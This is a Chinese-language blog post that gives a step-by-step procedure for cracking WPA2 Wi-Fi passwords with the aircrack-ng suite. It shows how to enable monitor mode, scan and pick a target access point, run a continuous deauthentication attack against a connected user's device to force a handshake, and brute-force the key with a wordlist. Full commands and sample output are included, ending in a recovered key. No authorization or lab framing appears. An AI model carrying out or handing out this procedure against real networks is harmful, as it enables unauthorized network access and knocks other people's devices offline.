---
layout: post
title: "aircrack-ng 破解WIFI密码"
date: 2020-07-01 22:08:00 +0800
comments: false
categories:
- 2020
- 2020~07
- tools
- tools~base
tags:
---

* 限制条件：监听时需要有用户成功连接WIFI

------------------

https://github.com/conwnet/wpa-dictionary

#### 安装 aircrack-ng

```
	sudo apt install aircrack-ng
```

#### 查看可用的无线网卡

```
	sudo airmon-ng
```

#### 指定无线网卡开启监听模式

```
	sudo airmon-ng start wlp8s0
```

开启后名字是 wlp8s0mon

开启监听模式后无线网卡无法继续连接 wifi，使用后需要关闭监听模式。

#### 扫描附近的无线网络

```
	$ sudo airodump-ng wlp8s0mon
	CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49              

	 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
	 22:47:DA:62:2A:F0  -50       51       12    0   6  54e. WPA2 CCMP   PSK  AndroidAP    
	 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  
	 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -31    0 -24e     0       16   

```

这一步会输出两个列表，两个列表不停在刷新。

第一个列表表示扫描到的无线网络 AP 信息，会用到以下几列信息：
```
    BSSID: 无线 AP 的硬件地址
    PWR: 信号强度，值是负数，绝对值越小表示信号越强
    CH: 无线网络信道
    ENC: 加密方式，我们要破解的是 WPA2
    ESSID: 无线网络的名称
```

第二个列表表示某个无线网络中和用户设备的连接信息：
```
    BSSID: 无线 AP 的硬件地址
    STATION: 用户设备的硬件地址
```
扫描列表会不停刷新，确定最终目标后按 Ctrl-C 退出。

#### 使用参数过滤扫描列表，确定扫描目标

```
	使用命令：airodump-ng -w <扫描结果保存的文件名> -c <无线网络信道> --bssid <目标无线 AP 的硬件地址> <处于监听模式的网卡名称>

	sudo airodump-ng -w android -c 6 --bssid 22:47:DA:62:2A:F0 wlp8s0mon


	CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49 ][ WPA handshake: 22:47:DA:62:2A:F0
	 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
	 22:47:DA:62:2A:F0  -33 100     1597      387   11   6  54e. WPA2 CCMP   PSK  AndroidAP
	 BSSID              STATION            PWR   Rate    Lost    Frames  Probe
	 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -32    1e-24e  1691     2657

```

刚扫描时看到输出的扫描状态是这样的：` CH 5 ][ Elapsed: 12 s ][ 2018-10-07 18:49`

只有当扫描状态后面出现 `][ WPA handshake: 22:47:DA:62:2A:F0` 后，我们才拿到拿到进行破解的握手包。

扫描过程中如果有用户设备尝试连接 Wi-Fi 时，我们就会拿到握手包。

所以我们可以同时使用 aireplay-ng 对目标设备进行攻击，使其掉线重新连接，这样我们就拿到了握手包。

拿到握手包后按 Ctrl-C 结束扫描即可。

#### 使用 aireplay-ng 对目标设备发起攻击

```
	使用命令：aireplay-ng -<攻击模式> <攻击次数> -a 无线 AP 硬件地址> -c <用户设备硬件地址> <处于监听模式的网卡名称>

	$ sudo aireplay-ng -0 0 -a 22:47:DA:62:2A:F0 -c AC:BC:32:96:31:8D wlp8s0mon
	18:57:31  Waiting for beacon frame (BSSID: 22:47:DA:62:2A:F0) on channel 6
	18:57:32  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [41|64 ACKs]
	18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [19|121 ACKs]
	18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [11|80 ACKs]
	...
```

发起攻击后，当 airodump-ng 成功拿到了握手包，使用 Ctrl-C 退出攻击。

#### 使用 aircrack-ng 暴力破解 Wi-Fi 密码

破解是本地操作，无需网络。

```
	使用命令：aircrack-ng -w 密码字典 <包含握手包的 cap 文件>

	$ aircrack-ng -w wpa-dictionary/common.txt android-01.cap 
	Opening android-01.cap
	Read 675 packets.

	   #  BSSID              ESSID                     Encryption

	   1  22:47:DA:62:2A:F0  AndroidAP                 WPA (1 handshake)

	Choosing first network as target.

	Opening android-01.cap
	Reading packets, please wait...

	                                 Aircrack-ng 1.2 rc4

	      [00:00:00] 12/2492 keys tested (828.33 k/s) 

	      Time left: 2 seconds                                       0.48%

	                          KEY FOUND! [ 1234567890 ]


	      Master Key     : A8 70 17 C2 C4 94 12 99 98 4B BB BE 41 23 5C 0D 
	                       4A 3D 62 55 85 64 B2 10 11 79 6C 41 1A A2 3B D3 

	      Transient Key  : 58 9D 0D 25 26 81 A9 8E A8 24 AB 1F 40 1A D9 ED 
	                       EE 10 17 75 F9 F1 01 EE E3 22 A5 09 54 A8 1D E7 
	                       28 76 8A 6C 9E FC D3 59 22 B7 82 4E C8 19 62 D9 
	                       F3 12 A0 1D E9 A4 7C 4B 85 AF 26 C5 BA 22 42 9A 

	      EAPOL HMAC     : 22 C1 BD A7 BB F4 12 A5 92 F6 30 5C F5 D4 EE BE 
```

#### 无线网卡退出监听模式

```
	sudo airmon-ng stop wlp8s0mon
```

